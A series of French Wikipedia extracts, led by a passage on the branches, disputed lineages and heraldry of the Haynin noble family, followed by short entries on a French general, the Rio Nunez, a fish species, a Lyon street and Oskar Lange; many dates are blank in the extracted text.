Jean de Haynin, qui continua les seigneur d'Amfroipret, et son frère Aubert de Haynin, auteur de la branche des seigneurs du Cornet et de Warrans, furent les auteurs de deux grandes branches principales, qui donnèrent de nombreux rameaux.
Félix-Victor Goethals donne pour la famille de Haynin, une généalogie des différentes branches et rameaux suivants, qui ne fait pas consensus auprès des généalogistes contemporains cités plus haut, ni avec la généalogie donnée en 1774 par François-Alexandre Aubert de La Chenaye-Desbois, ni avec la généalogie donnée en 1840 par Nicolas Viton de Saint-Allais, ni aussi avec la notice généalogique sur la famille de Haynin publiée en 1952 dans le "Grand Armorial de France", rédigée à partir des preuves du cabinet d'Hozier, citant les familles confirmées dans leur noblesse entre 1660 et 1830.
Branche ainée d'Amfroipret et de Wambrechies.
Cette branche ainée a pour auteur Jean dit Brougnart de Haynin, seigneur de Haynin et deuxième seigneur d'Amfroipret, fils ainé d'Étienne dit Brognard de Haynin, seigneur de Haynin et premier seigneur d’Amfroipret, et de Marie du Breucq. Il épousa Marie de Pottes.
De la branche ainée d'Amfroipret et de Wambrechies, sont issues les rameaux suivants :
Ce rameau, à l'origine de tous les autres rameaux de la branche ainée d'Amfroipret et de Wambrechies, commence par Jean dit Brougnart de Haynin, seigneur de Haynin et deuxième seigneur d'Amfroipret, marié à Marie de Pottes.
Nicolas Viton de Saint-Allais attribut à Jean dit Brougnart de Haynin le gisant de l'église du Grand-Wargny. Félix-Victor Goethals attribut ce gisant à Jehan Bastard de Haynin. Pierre Sage attribut ce gisant à Jehan Bastard de Hainaut.
Ce rameau finit avec Jacques de Haynin seigneur d'Amfroipret, fils puîné de Claude de Haynin, seigneur d'Amfroipret, Gussignies, Bettrechies et de Jacqueline de Carondelet. Il épousa Françoise de la Pierre, fille de Robert, seigneur de Bousies. Leur fille Hélène de Haynin dame d'Amfroipret épousa Pierre-Philippe du Chasteler, seigneur de Relegen.
Ce rameau, issu de celui des seigneurs de Haynin et d'Amfroipret, a pour auteur Charles de Haynin seigneur de Gussignies, guidon d'ordonnance du comte de Berlaymont, fils puîné de Claude de Haynin, seigneur d'Amfroipret, Gussignies, Bettrechies et de Jacqueline de Carondelet. Il épousa Louise de Ruelin dame d'Eth.
Il n'eut que deux enfants : Antoine, sans postérité connue et Anne mariée en 1626 à Jacques de Haynin seigneur du Cornet, gouverneur de Landrecies.
Ce rameau, issu de celui des seigneurs de Haynin et d'Amfroipret, a pour auteur Ghislain de Haynin, chevalier, seigneur du Breucq, fils de François de Haynin, seigneur d'Amfroipret, de Gussignies et du Breucq et d'Antoinette de Terremonde. Il épousa Marguerite Domissent.
Il finit avec Henri de Haynin, vicomte du Breucq et de Seclin, gentilhomme de la maison de l'Archiduc Albert. Il épousa en 1633 Anne de Gruutere, dont il n'eut que des filles.
Ce rameau est issu de celui des seigneurs du Breucq. Il a pour auteur Jean-Charles de Haynin, chevalier, seigneur du Maisnil, mayeur de Saint-Omer, fils cadet de François de Haynin, seigneur du Breucq et de Françoise le Sauvaige.
Il finit avec Henri-Philippe de Haynin, seigneur du Maisnil et de Watinnes, marié à Anne-Eléonore de Berghes dont il n'eut que des filles.
Ce rameau, issu de celui des seigneurs de Haynin et d'Amfroipret, a pour auteur Jean de Haynin, seigneur de Haynin et de Wambrechies, fils de Philippe de Haynin, seigneur de Haynin (†1538), maître d'hôtel de l'archiduc Philippe d'Autriche, et de Claire de Croix, dame de Wambrechies. Il épousa Anne d'Ongnies.
Il finit avec Louis-François de Haynin, baron de Haynin, seigneur d'Amfroipret, né à Lille en 1700, qui de son mariage en 1737 avec Marie-Ignace de Widebien, n'eut qu'une fille, née en 1741.
Ce rameau, issu de celui des seigneurs de Haynin et de Wambrechies, a pour auteur François de Haynin, seigneur de Haynin de Wambrechies, baron d'Hamelincourt († 1620), fils de Philippe de Haynin, seigneur de Haynin et de Wambrechies(† 1620) et de Jeanne de Douvrin, dame d'Hamelincourt. Il épousa en 1610 Florence-Marie d'Estourmel-Creton.
Il finit avec Philippe-Charles de Haynin, baron de Haynin, mort à Lille en 1709, sans postérité.
Ce rameau, issu de celui des seigneurs de Haynin et d'Amfroipret, a pour auteur Ghislain de Haynin, seigneur de Louvignies, né au château de Haynin en 1474, fils cadet de Jean dit Brougnard, seigneur de Haynin et de Marie de Roisin. Il épousa Jeanne de Hun.
Il finit avec lui. Il eut deux fils sans postérité et des filles dont Jeanne de Haynin, dame de Louvignies, panetière héréditaire du Hainaut, mort en 1556, qui épousa Jean-Baptiste de Ferrare.
Rameau de l'Est valenciennois.
Selon Casimir de Sars de Solmont : 
« Il y a une branche de cette maison qui ont brisé leurs armes ainsi d'or à la croix engrêlée de gueules, accompagnée d'un croissant et d'une étoile en chef, et d'une étoile et d'un croissant en pointe le tout aussi de gueules, pour brisure. ».
Pierre Sage a relevé ces armes dans l'église d'Estreux, sur la tombe de David de Haynin, décédé le , époux de Barbe Demoutier, décédée le .
Le chanoine Leridan, dans "l'épigraphie de Valenciennes", a relevé ces armes dans l'église Saint-Géry de Valenciennes : « 1711-1719 - Petite nef à droite, pierre blanche. Armes : Haynin : croix engrêlée canton née de 2 croissants (aux 1 et 4) et de 2 étoiles (aux 2 et 3). ». 
Jean Henry de Haynin est décédé le à Valenciennes Saint-Géry, à l’âge de 67 ans, veuf de Jenne Durieux. Jenne Durieux est décédée le à Valenciennes Saint-Géry, à l’âge de 63 ans, épouse de Jean Henry de Haynin. 
Jean Henry de Haynin, né le à Valenciennes Saint-Nicolas, est le fils aîné de David de Haynin et de Barbe Desmoutiers.
Le chanoine Van Drivel, dans "le nécrologue de l'Abbaye Saint-Vaast", a relevé ces armes, brisées d'argent et non de gueules. Ces armes sont attribuées à Basile de Haynin (Basile est le nom en religion de Laurent Cornil de Haynin), né le à Valenciennes Saint-Vaast, fils cadet de David de Haynin et de Barbe Desmoutier. 
David Joseph de Haynin, bailli de Roeulx, appose son sceau sur un document en date du . 
David Joseph de Haynin porte « une croix engrêlée accompagnée d’un croissant et d’une molette à six raies en chef et d’une molette à six raies et d’un croissant en pointe ».
David Joseph de Haynin est le fils de Jean Henry et de Jenne Durieux, né le à Valenciennes Saint-Nicolas.
Sur le sceau de David Joseph de Haynin en date du , ses armoiries blasonnent un heaume ouvert, orienté à dextre, indiquant un nouvel anobli.
David Joseph de Haynin, âgé de 60 ans ou environ et échevin de la ville de Valenciennes, est qualifié de « Monsieur », dans l'acte de son décès le à Valenciennes Saint-Nicolas.
David Joseph de Haynin, licencié-es-lois, ancien juré, échevin de la ville de Valenciennes, bailli de Sebourg, Villerspols et Maresches, est qualifié de « Monsieur », et son épouse de « Mademoiselle », dans l'acte de décès de son épouse, Marie Madeleine Pedecoeur, le à Valenciennes Notre-Dame-de-la-Chaussée.
David de Haynin, Jean Henry de Haynin et David Joseph de Haynin ne sont pas mentionnés dans l’"Armorial général de France" dressé par Charles d’Hozier, en vertu de l'édit de 1696.
David Joseph de Haynin n'est pas mentionné dans la notice généalogique sur la famille de Haynin publiée en 1952 dans le "Grand Armorial de France", rédigée à partir des preuves du cabinet d'Hozier, citant les familles confirmées dans leur noblesse entre 1660 et 1830.
Pierre Sage rattache ce rameau à Jehan Bastart de Haynin (rameau des seigneurs de Haynin et d'Amfroipret).
Branche cadette du Cornet.
Cette branche cadette a pour auteur Aubert de Haynin, fils puîné d'Étienne dit Brognard de Haynin, seigneur de Haynin et d’Amfroipret et de Marie du Breucq. Il épousa Marguerite de Rosimbos.
De la branche cadette du Cornet, sont issues les rameaux suivants :
Ce rameau, à l'origine de tous les autres rameaux de la branche cadette du Cornet, commence par :
Il finit avec Ernest-Charles-André de Haynin, chevalier, seigneur du Cornet et de Cerfontaines, mort au château de Cerfontaines le . De son mariage en 1697 avec Catherine de Lardenois de Ville, il n'eut que des filles.
Ce rameau, issu de celui des seigneurs du Cornet et de Frémicourt, a pour auteur Colard de Hennin, mort à Cambrai en 1507, fils puîné d'Innocent de Haynin, seigneur du Cornet et de Frémicourt et de Jeanne de Godry.
Il finit en 1627 avec Philippe de Hennin, seigneur du Legyes, bourgmestre de la ville de Malines.
Félix-Victor Goethals écrit qu'Antoine de Hennin fils d'Alard (fils de Colard de Hennin) et de Jeanne de Godrie n'a pas eu de descendance.
Jean de Pitpan de Montauban (1581-1641), selon un manuscrit du conservé à la bibliothèque municipale de Cambrai, Thierry de Hennin de Boussu Walcourt, dans son ouvrage : "Les origines et l'ascendance de la maison de Hennin de Boussu Walcourt", et Pierre Sage, dans un article publié dans le "Bulletin de l'Association Généalogique et Historique Flandre-Hainaut", de , donne à Antoine de Hennin, fils d'Allart et de Jeanne de Godrie, une épouse, Michelle Le Hubert, et la même descendance.
Ce rameau, issu de celui des seigneurs de Legyes, a pour auteur philippe de Haynin, seigneur de la vallée et de Wavrans, fils cadet de Mathieu de Haynin, seigneur de la Cocquerie et de la Tour et de Marie de lesplucq, dame de Legye. Il épousa Jeanne de Herlin, dame de la Vallée.
Il finit avec Philippe-François de Haynin, seigneur de la Vallée, de Wavrans et de Portingal, marié en 1646 avec Marie-Philipotte de Haynin, fille de François de Haynin, seigneur de Wambrechies.
Ce rameau, issu de celui des seigneurs de la Vallée et de Wavrans, a pour auteur Pierre de Haynin, seigneur de Doncq, fils puîné de Philippe de Haynin, seigneur de la Vallée et de Françoise de Hennin-Liétard, marié 1° à Eléonore de Wazières, 2° à Chrétienne de Farvacques et mort en 1661.
Il finit avec son fils François-Paul de Haynin.
Ce rameau, issu de celui des seigneurs de Legyes, a pour auteur Antoine de Haynin, mort en 1551 à Cambrai, fils de Colard de Haynin et de sa seconde femme Cornélie d'Avesnes et marié à Antoinette de Curlu, et père de Claude de Hennin, seigneur de Warlaing et de Quérénaing.
Il finit avec Philippe Louis de Haynin, marquis de Quérénaing dont la fille unique épousa octave-Alexandre marquis de Nédonchel.
La Chenaye-Desbois dans son ouvrage : "Dictionnaire Généalogique", émet des réserves quant au rattachement de cette famille à la maison de Haynin et écrit : « Cette famille prétend descendre de Haynin-Wambrechies par Innocent auquel on donne jusqu'à vingt enfants... ».
Ce rameau, issu de celui des seigneurs de Warlaing et de Querenaing, a pour auteur Jacques de Hennin, seigneur des Grand-Fayt et Petit-Fayt et de Corionville, fils de Claude de Haynin et de Julienne Préau, sa seconde femme.
Il finit avec César de Hennin, chevalier par confirmation de Philippe IV en 1659, baron de Bousbeke, seigneur de Courtembecque, mort célibataire en 1678. Le , des lettres de chevalerie sont données à Madrid pour César de Haynin, écuyer, demeurant à Lille, descendant de l'ancienne et noble famille de Haynin. Son père Pierre de Haynin, écuyer, seigneur de Courtembecque, a servi au siège de Louvain et à celui de Lillers en 1635 et 1639, avec trois cavaliers équipés à ses frais. Ferdinand de Haynin, son frère, a servi pendant plus de sept ans, à grands frais, dans l'infanterie espagnole sous Francisco Deca, et est mort au service après s'être signalé au combat de Lens (bataille de Lens), où il a été fait prisonnier et rançonné (délivré contre rançon sans doute) par son dit père après une longue et fâcheuse prison.
Ce rameau, issu de celui des seigneurs du Fayt, a pour auteur Claude de Haynin, seigneur de Corionville par lettres de relief de 1633. Il était le fils de Jacques de Hennin, seigneur des Grand-Fayt et Petit-Fayt et de Rose Hennuyer. Demeurant à Anvers, il y épousa Sara Peeters.
Il finit avec son fils Jacques de Hennin, seigneur de Corionville, bourgmestre d'Anvers.
Ce rameau, issu de celui des seigneurs de Warlaing et de Querenaing, a pour auteur Jean de Haynin, mort à Cambrai en 1580, fils puîné d'Antoine de Haynin et d'Antoinette de Curlu. Il épousa Marie-Françoise Rosel.
Il finit avec Louis-Charles de Haynin, chevalier par lettres patentes de 1659, seigneur de Barat, gentilhomme et ambassadeur plénipotentiaire du roi d'Espagne, marié à Anne-Marie-Sara de Haynin dame des Grand-Fayt et Petit-Fayt. leur fille Marie-Thérèse épousa en 1690 Philippe-Ignace de La Barre, seigneur d'Erquelines.
 est dite dans la notice généalogique sur la famille de Haynin publiée en 1952 dans le "Grand Armorial de France", rédigée à partir des preuves du cabinet d'Hozier, citant les familles confirmées dans leur noblesse entre 1660 et 1830.
Ce rameau, issu de celui des seigneurs de Warlaing et de Querenaing, a pour auteur Henri de Haynin, fils d' Antoine de Haynin et d'Antoinette de Curlu, marié en 1537 à Marie de Landas. Ils étaient morts en 1575.
Il finit avec Jacques-Maximilien de Hennin, seigneur de Calbreucq, marié en 1761 avec Marie de Maleingreau, décédée en 1782.
Ce rameau, issu de celui des seigneurs de Calbreucq, a pour auteur Charles de Haynin, seigneur d'Aire, fils puîné de Jean-Baptiste de Hennin, chevalier et de Jeanne du Bus. Il épousa Marie-Anne de Carnin dite Le Boucq. Il eut un petit-fils qui s'établit à Baisieux entre Lille et Tournai dont la postérité n'est pas connue selon Félix-Victor Goethals.
Paul-Armand du Chastel de la Howarderie en donne une descendance subsistante en 1872, de Charles Joseph de Haynin, époux de Marie Rose Trialle, installé à Baisieux, petit-fils de Charles de Haynin et de Marie-Anne de Carnin dite Le Boucq.
Ce rameau, issu de celui des seigneurs de Calbreucq, a pour auteur Henri de Hennin, fils puîné de Jean-Baptiste de Hennin, chevalier et de Jeanne du Bus. Il épousa Marie Englart.
Il finit avec Louis-Christophe-julien de Haynin, né en 1750.
Ce rameau, issu de celui des seigneurs de Calbreucq, a pour auteur Charles de Haynin, seigneur de la haye (1610-1679), fils puîné de Jean de Hennin, seigneur de Calbreucq et de Madelaine Wallet, marié en 1632 à Anne Savreux.
Il finit avec Pierre de Haynin, seigneur de la Haye, capitaine au terce du comte de Boussu et de Franquet, marié à Jeanne Carlier et mort en 1691.
Ce rameau, issu de celui des seigneurs de la Haye, a pour auteur Charles de Haynin, seigneur de Martinchamps, né en 1642 fils puîné de Charles de Haynin, seigneur de la haye et de Anne Savreux. Il épousa en 1670 Anne de le Vielleuze dont il n'eut que deux filles.
Ce rameau, issu de celui des seigneurs de Legyes, a pour auteur Nicolas de Haynin, fils cadet de Colard de Hennin et de Cornélie d'Avesnes, sa seconde femme. Il épousa Barbe de Barbaise.
Il finit avec les deux fils et les deux filles d'Henri de Haynin, décédé le à Valenciennes Saint-Jacques, marié avec Anne Jappin.
Rameau Hennin de Boussu.
Comme mentionné plus haut, ce n'est qu'à partir du milieu du que des généalogistes, dont Félix-Victor Goethals en 1857, rattachent pour la première fois à la branche cadette du Cornet de la maison de Haynin un rameau dit "Hennin de Boussu", d'où sont issues la famille de Hennin de Boussu Walcourt et la famille des de Haynin de Bry, 
Selon Félix-Victor Goethals, ce rameau a pour auteur Jacques de Hennin, marié en 1645 à Anne Le Caron.
Les généalogistes s'accordent pour rattacher le rameau "Hennin de Boussu" à Colart de Hennin fils puîné d'Innocent de Hennin (rameau "des seigneurs de Legyes", venant du rameau "des seigneurs du Cornet et de Frémicourt" et appartenant à la branche cadette du Cornet), sans pour autant en donner le même point de rattachement.
Selon Félix-Victor Goethals, Jacques de Hennin fut le père d'autre Jacques de Hennin (1656-1737), échevin de la ville de Cambrai, marié en 1683 à Marguerite-Alphonsine Bourdon. Son petit-fils Pierre-Joseph de Hennin (1687-ca 1776), bourgeois et rentier de Cambrai, greffier du chapitre métropolitain, marié à Marie-Catherine Dupuis fut le père de :
Le collectif de généalogistes belges "Blaise d'Ostende-à-Arlon", dans "Noblesse belge d'aujourd'hui" (1967) écrit : « Jacques (de Hennin), licencié ès loi et échevin de Cambrai, eut deux fils, Pierre-Joseph, auteur de la branche devenue belge et louis-Joseph, tabellion (...) De Jacques cité plus haut descend non seulement la branche belge mais encore une autre branche ignorée de l'auteur (Thierry de Hennin), branche qui s'illustra à Cambrai en la personne de Louis qui épousa Célestine Lerouge, fille d'un cultivateur. ».
Selon Félix-Victor Goethals, Jacques de Hennin est le fils de Jean de Haynin, écuyer et de Eléonore de Buirette, et descend de Jean de Hennin, décédé le à Cambrai, époux de Marie Françoise Rosel, fils d'Antoine et Antoinette Curlu (rameau "des seigneurs de Warlaing et de Querenaing", venant du rameau "des seigneurs de Leygies").
Le collectif de généalogistes belges "Blaise d'Ostende-à-Arlon", dans "Noblesse belge d'aujourd'hui" (1967) écrit : « Pratiquement les Hennin-Boussu-Walcourt descendent de Jean, marchand à Cambrai, décédé vers 1580 (rameau "des seigneurs de Warlaing et de Querenaing", venant du rameau "des seigneurs de Leygies"), dont le petit-fils (...) fut père de Jacques, licencié ès loi et échevin de Cambrai (rameau "Hennin de Boussu"). ».
Jean-François Houtart, dans son ouvrage : "Anciennes familles de Belgique" (2008), édité par l"'Office généalogique et héraldique de Belgique", rattache la famille de Hennin de Boussu Walcourt, issu du rameau "Hennin de Boussu", à Alard de Hennin qui passa un contrat de mariage avec Jeanne Godrie devant les échevins de la ville de Cambrai le (rameau "des seigneurs de Leygies").
Selon un manuscrit du de Jean de Pitpan de Montauban (1581-1641), conservé à la bibliothèque municipale de Cambrai, Jacques de Hennin est le fils de Richard de Hennin et d'Antoinette Laude, et descend d'Alard de Hennin, époux de Jeanne de Godrie (rameau "des seigneurs de Leygies').
Thierry de Hennin de Boussu Walcourt, dans son ouvrage : "Les origines et l'ascendance de la maison de Hennin de Boussu Walcourt", donne Jacques de Hennin, comme fils de Richard de Hennin, marié à Antoinette Laude, et descendant d'Alard de Hennin, époux de Jeanne de Godrie (rameau "des seigneurs de Leygies").
Pierre Sage, dans un article publié dans le "Bulletin de l'Association Généalogique et Historique Flandre-Hainaut", de , donne Jacques de Hennin, comme fils de Richard de Hennin, marié à Antoinette Laude, et lui donne la même ascendance que Jean de Pitpan de Montauban et Thierry de Hennin de Boussu Walcourt, jusqu'à Alard de Hennin, époux de Jeanne de Godrie (rameau "des seigneurs de Leygies").
Pierre Sage précise : « Il est possible d’établir sur pièces l’ascendance d’Ernest Prosper de Hennin de Boussu Walcourt (rameau "Hennin de Boussu") jusqu’à Innocent de Haynin, seigneur du Cornet et de Frémicourt (rameau "des seigneurs du Cornet et de Frémicourt") avec les actes de mariages et les contrats de mariages sauf pour quatre filiations », établies par les actes en références.
Dans l'acte de baptême de Prosper de Hennin, le à Cambrai, son père Pierre de Hennin, est qualifié de « sieur, franc servant au chapitre de la Métropole », et son épouse de « demoiselle ».
Dans les actes, où sont mentionnés Alard de Hennin, époux de Jeanne de Godrie et ses descendants, il n'est mentionné aucune qualification nobiliaire.
Le collectif de généalogistes belges "Blaise d'Ostende-à-Arlon", dans "Noblesse belge d'aujourd'hui" (1967) écrit : « Pratiquement les Hennin-Boussu-Walcourt descendent de Jean, marchand à Cambrai, décédé vers 1580, dont le petit-fils (selon Thierry de Henin) aurait dérogé (et le père marchand, non ?) et fut père de Jacques, licencié ès loi et échevin de Cambrai ».
Ce rameau "Hennin de Boussu" n'existe pas dans la généalogie de la maison de Haynin donnée en 1774 par La Chenaye-Desbois.
Ce rameau "Hennin de Boussu" n'est pas mentionné dans la notice généalogique sur la famille de Haynin publiée en 1952 dans le "Grand Armorial de France", rédigée à partir des preuves du cabinet d'Hozier, citant les familles confirmées dans leur noblesse entre 1660 et 1830.
Thèse sur le rattachement de la famille de Hennin de Boussu Walcourt à la maison de Haynin et la contestation de celle-ci.
Anoblissement de La famille de Hennin de Boussu Walcourt.
La famille de Hennin de Boussu Walcourt fut d'abord anoblie en Belgique, en 1932, avec des armoiries totalement distinctes de celles de la maison de Haynin.
Elle fut ensuite admise dans la noblesse belge en 1958 par le Conseil héraldique sur la base d'une sentence de l'Élection d'Artois du , en faveur de Claude de Haynin, dit de Hennin, seigneur de Warlaing et de Querenaing, prévôt de Valenciennes, mort en 1622, et d'un arrêt du Grand Conseil de Malines du , en faveur de Philippe de Haynin, chevalier, seigneur de Wavrans, La Vallée, Rechem, Portingal etc., sentence et arrêt reconnaissant aux deux mentionnés la noblesse et le droit au port des armes pleines de la maison de Haynin (si le rameau dit "Hennin de Boussu", cité par Félix-Victor Goethals, d'où est issue la famille de Hennin de Boussu Walcourt, ne descend pas des deux bénéficiaires, ces derniers, comme le rameau dit "Hennin de Boussu", descendent de Colart de Hennin fils puîné d'Innocent de Hennin). 
A l'issue de cette admission, la famille de Hennin de Boussu Walcourt modifia ses armoiries pour s'attribuer les armes pleines de la maison de Haynin, brisées d'un croissant de gueules dans le premier canton. Ces armes étaient celles de Colart de Hennin fils puîné d'Innocent de Hennin (le rameau dit "Hennin de Boussu", cité par Félix-Victor Goethals, d'où est issue la famille de Hennin de Boussu Walcourt, descend de Colart de Hennin fils puîné d'Innocent de Hennin).
Finalement, elle obtint deux reconnaissances de noblesse en Belgique en 1983 et 1984.
Le point de vue des anciens.
La Chenaye-Desbois, Nicolas Viton de Saint-Allais et Félix-Victor Goethals, s'accordent à rattacher à la maison de Haynin, la branche cadette du Cornet, issue d'Aubert de Haynin, époux de Marguerite de Rosimbos, fils puîné d'Étienne dit Brognard de Haynin, seigneur de Haynin et d’Amfroipret et de Marie du Breucq :
Félix-Victor Goethals écrit sur Aubert de Haynin : « Lambert (Aubert) de Haynin épousa Marguerite de Rosimbos. Bien qu’il semble avoir été frère puîné de Jean, seigneur de Haynin, qui épousa une fille de Pottes, il fit que les aînés de la branche, à laquelle il donna commencement, ont toujours porté, comme ils portent encore, les armes pleines de la Maison, avec cette différence néanmoins, qu’ils ont pris un griffon pour cimier, où les seigneurs de Haynin ont usé, comme ils usent de Rosimbos encore à présent, de deux pieds de cerf. Au reste la branche formée par Aubert ainsi que toute sa descendance mâle a été prouvée, à deux différentes reprises, par-devant le Conseil d’Artois et le grand-conseil de Malines. Ces deux arrêts prononcés par des autorités aussi compétentes sont nos principaux guides. ».
Le point de vue des modernes.
Des généalogistes contemporains, comme Frédéric Collon, le collectif de généalogistes Blaise d'Ostende-à-Arlon ou encore Jean-François Houtart, émettent des réserves ou rejettent ce rattachement de la famille de Hennin de Boussu Walcourt à la maison de Haynin :
Pierre Sage, généalogiste et membre de l'Association Généalogique Flandres Hainaut (A.G.F.H.), est en désaccord avec les auteurs précédents :
Héraldisme.
Armes.
Armes pleines : "D'or, à la croix engrêlée de gueules."
Le douzième volume de l’"Armorial général de France", dressé en vertu de l'édit de 1696, par Charles d’Hozier, consacré aux Flandres, et le vingt-sixième volume, consacré à la Picardie, recensent différents blasons dont les attributaires sont Haynin, Hainin ou Hennin et qui sont répertoriés ci-dessous.
Tous les attributaires sont cités par Félix-Victor Goethals, Casimir de Sars de Solmont ou Jean de Pitpan de Montauban, et appartiennent aux rameaux indiqués ci-dessous. 
Blasons.
Bonne Françoise de Haynin mariée par contrat passé à Lille de à Michel de Keyssel (rameau des seigneurs de Haynin et de Wambrechies).
Joseph de Haynin, baron de Haynin et d'Hamelincourt, seigneur de Wambrechies mort à Maubeuge en 1711 (rameau des seigneurs de Haynin et de Wambrechies).
Jeanne de Haynin fille de Philippe de Haynin, seigneur du Maisnil, et d'Adrienne Jeanne de Varennes, épouse de Guillaume de Wagnon (rameau des seigneurs du Maisnil).
Marie Catherine Emmanuelle de la Biche, dame de Cerfontaine, épouse d'Ernest de Haynin, seigneur du Cornet et de Frémicourt (rameau des seigneurs du Cornet et de Frémicourt).
Laurent de Hennin, chanoine de Sainte Croix, est, selon Jean de Pitpan de Montauban, un descendant d'Alard de Haynin (rameau des seigneurs de Leygies).
Philippe Albert de Haynin, seigneur de Wavrans, fils de Philippe François et de Marie Philipotte de Haynin (rameau des seigneurs de la Vallée et de Wavrans).
Jacques Philippe de Hayinin, seigneur de la baronnie de Quérénaing et de la Motte épousa Marie Adrienne Thérèse de Lens (rameau des seigneurs de Warlaing et de Quérénaing).
Philippe Louis de Haynin, marquis de Quérénaing épousa Marie Madeleine Damman (rameau des seigneurs de Warlaing et de Quérénaing).
Anne de Haynin, fille de Pierre et de Marie de Groot, épouse par contrat du 29 janvier 1658 à Tournai, Guillaume le Vaillant Waudripont (rameau des seigneurs du Fayt).
Antoine de Haynin, seigneur de Neuville (rameau des seigneurs du Fayt).
Louis Charles de Haynin, chevalier par lettre patente de 1659, seigneur de Barat, il épousa Anne Marie Sara de Haynin (rameau des seigneurs de Talma).
Marie Jeanne Thérèse de Haynin, dite Barat, dame des grand et petit-Fayt, se maria le avec Philippe-Ignace de la Barre (rameau des seigneurs de Talma).
Marie-Joseph de Haynin, fille d'Antoine et de Marie Catherine Spriermont, a épousé par contrat du 29 mai 1638 Octave Alexandre de Bryas. Selon Casimir de Sars de Solmont, Antoine de Haynin, époux de Marie Catherine Spriermont, a épousé en premières noces Marie Madeleine Helduiere, qui est, selon Goethals, le fils d'Antoine de Haynin et de Françoise Ballicq (rameau des seigneurs de Talma).
Michel de Haynin, chanoine de Saint Pierre à Lille (rameau des seigneurs de Calbreucq).
Christine de Haynin et Jean-Baptiste de Haynin, seigneur de Breuze, capitaine au service de Louis XIV selon Félix-Victor Goethals, ont eu une fille, Anne Marie Christine, née le 15 décembre 1689 à Lille Saint-André, dont le parrain est Michel de HAYNIN, seigneur de Layens (rameau des seigneurs de Calbreucq).
Jean Baptiste de Haynin, seigneur de Breuze, capitaine au service de Louis XIV selon Félix-Victor Goethals (rameau des seigneurs de Calbreucq).
Charles de Haynin, seigneur d'Aire, époux de Marie Anne de Carnin dite le Boucq (Rameau des seigneurs d'Aire).
Henri de Haynin, chevalier (rameau des seigneurs de Pretz).
Personnalités.
Rameau des seigneurs de Haynin et d'Amfroipret :
Rameau des seigneurs de Haynin et de Wambrechies
Rameau des seigneurs du Cornet et de Frémicourt :
Rameau des seigneurs de Warlaing et de Querenaing :
Rameau Hennin de Boussu :

</doc>
<doc id="2843948" url="https://fr.wikipedia.org/wiki?curid=2843948" title="Roer">
Roer



</doc>
<doc id="2843953" url="https://fr.wikipedia.org/wiki?curid=2843953" title="Raytheon Corporation">
Raytheon Corporation



</doc>
<doc id="2843957" url="https://fr.wikipedia.org/wiki?curid=2843957" title="Pierre Vincent (général)">
Pierre Vincent (général)

Pierre Vincent est un général français né le à Oujda et mort le à Chambéry.
Soldat pendant 37 ans, il prend part à la Seconde Guerre mondiale, la guerre d'Indochine et la guerre d'Algérie, et est blessé trois fois.
Biographie.
Origines familiales.
Pierre Vincent, issu d'une famille de tradition militaire, naît à Oujda alors que son père, le général Jean Vincent (dit « Vény » dans la Résistance) est lieutenant au d'Afrique en poste à Debdou. Son grand père est le médecin militaire Louis-Alexandre Vincent (1842-1904).
Après la Grande Guerre, il vit dans un cadre militaire en Algérie, puis au Maroc lorsque son père sert au étranger à Meknès. Il effectue ses études secondaires au lycée Poeymirou de Meknès ; reçu bachelier ès mathématiques élémentaires en 1933 et 1934, il est admissible à l'école spéciale militaire de Saint-Cyr en 1934. Ses études terminées, il choisit la carrière militaire et s'engage par devancement d'appel le .
Il épouse, le , Marie-Antoinette de Regnauld de Lannoy de Bissy (1916-2012), fille de Pierre, comte de Bissy, et de Marie-Ange de Maistre (descendante de deux grandes familles nobles savoyardes, de Maistre et de Regnauld de Lannoy de Bissy) et petite-fille de Richard de Regnauld de Lannoy de Bissy. Ils ont six enfants.
Retraite.
Présent dans de nombreuses associations, il est élu en 1971 à l'Académie de Savoie. Il en devient membre agrégé en 1986.
En , une cérémonie a lieu en préfecture de Savoie pour son centenaire.
Il meurt le à la résidence Saint-Benoît de Chambéry, à l'âge de 101 ans.
Publications.
Il s'agit de communications faites à l'Académie de Savoie.
Carrière militaire et distinctions.
Citations.
Le général Pierre Vincent a été cité à de nombreuses reprises :
Notes et références.
Références.
Les références notées « DL » dans le texte proviennent du site officiel du Dauphiné libéré (www.ledauphine.com).

</doc>
<doc id="2843960" url="https://fr.wikipedia.org/wiki?curid=2843960" title="Liste des subdivisions administratives du Xizang">
Liste des subdivisions administratives du Xizang



</doc>
<doc id="2843965" url="https://fr.wikipedia.org/wiki?curid=2843965" title="Rio Nunez">
Rio Nunez

Le Rio Nunez est un fleuve côtier de Guinée.
Géographie.
Il se caractérise par un estuaire d'une cinquantaine de kilomètres. C'est l'une des très nombreuses rias de Guinée maritime, telles le Rio Komponi plus au nord ou le Rio Pongo au sud.
Histoire.
Les navigateurs portugais arrivèrent à l'embouchure au milieu du . Le Rio tiendrait son nom du navigateur Nuno Tristão, comme les îles Tristao situées plus au nord, à la frontière avec la Guinée-Bissao.
Économie.
Sur la rive gauche de l'estuaire se trouve la ville de Kamsar, avec son port minéralier d'où partent les exportations de bauxite. Dans le haut du Rio Nuñez pousse des caféiers sauvage dont la population locale fait le commerce du café, apprécié des Français pour son goût proche du moka d'Arabie.

</doc>
<doc id="2843971" url="https://fr.wikipedia.org/wiki?curid=2843971" title="Menidia beryllina">
Menidia beryllina

Menidia beryllina (Cope, 1867) est une espèce de poisson appartenant à la famille des Atherinopsidae.

</doc>
<doc id="2843974" url="https://fr.wikipedia.org/wiki?curid=2843974" title="Guerre sino francaise">
Guerre sino francaise



</doc>
<doc id="2843976" url="https://fr.wikipedia.org/wiki?curid=2843976" title="Rue Lainerie">
Rue Lainerie

La rue Lainerie est une rue piétonne pavée du quartier du Vieux Lyon, dans le de Lyon. D'orientation nord-sud, elle relie la place du Change et la place Saint-Paul. Au se trouve un local du conservatoire de musique ("section vieux Lyon").
Histoire.
Le tracé de la rue Lainerie remonte au plus haut Moyen Âge. Son nom provient de la déformation de "Rue de l'Asnerie", de nombreuses écuries abritant les ânes les jours de foire.
Cependant, dans sa partie nord, à l'embranchement avec la rue François Vernay, de nombreuses maisons anciennes ont été rasées en 1911, sous , à l'occasion des travaux d'aménagement du quartier comprenant la construction de la Gare Saint-Paul (1874) et du Palais de Bondy, abritant la Salle Molière (1904).
Cours et traboules.
La rue possède de très nombreuses cours et traboules dont quelques-unes sont ouvertes aux visiteurs. D'autres feront l'objet de conventions avec la Ville de Lyon pour permettre leur ouverture.

</doc>
<doc id="2843984" url="https://fr.wikipedia.org/wiki?curid=2843984" title="Oskar Lange">
Oskar Lange

Oskar Lange (de son nom complet Oskar Ryszard Lange) est un économiste et diplomate polonais, né le à Tomaszów Mazowiecki et mort le à Londres.
Biographie.
